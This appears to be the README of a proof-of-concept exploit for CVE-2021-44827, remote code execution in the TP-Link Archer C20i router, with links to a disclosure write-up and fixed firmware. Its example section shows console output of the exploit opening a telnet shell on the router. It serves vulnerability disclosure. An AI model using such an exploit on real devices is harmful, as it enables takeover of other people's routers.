# CVE-2021-44827
A PoC for CVE-2021-44827 - authenticated remote code execution in Tp-link Archer C20i

Write-up: [https://full-disclosure.eu/reports/2022/CVE-2021-44827-tplink-authenticated-remote-code-execution.html](https://full-disclosure.eu/reports/2022/CVE-2021-44827-tplink-authenticated-remote-code-execution.html)

# Example

<pre>
$ python exploit.py
[error]0
[error]0
Run post_exploit_cmd
Trying 192.168.0.1...
Connected to 192.168.0.1
Escape character is '^]'

~ #
~ # ls
web      usr      sbin     mnt      lib      dev
var      sys      proc     linuxrc  etc      bin
~ # id
sh: id: not found
~ # uname -a
sh: uname: not found
~ # cat /proc/version
Linux version 2.6.36 (root@localhost.localdomain) (gcc version 4.6.3 (Buildroot 2012.11.1) ) #1 Tue Feb 21 14:47:04 HKT 2017
</pre>

# Fix

Fixed in [https://static.tp-link.com/upload/firmware/2022/202202/20220217/Archer%20C20i(EU)_V1_220107.zip](https://static.tp-link.com/upload/firmware/2022/202202/20220217/Archer%20C20i(EU)_V1_220107.zip)
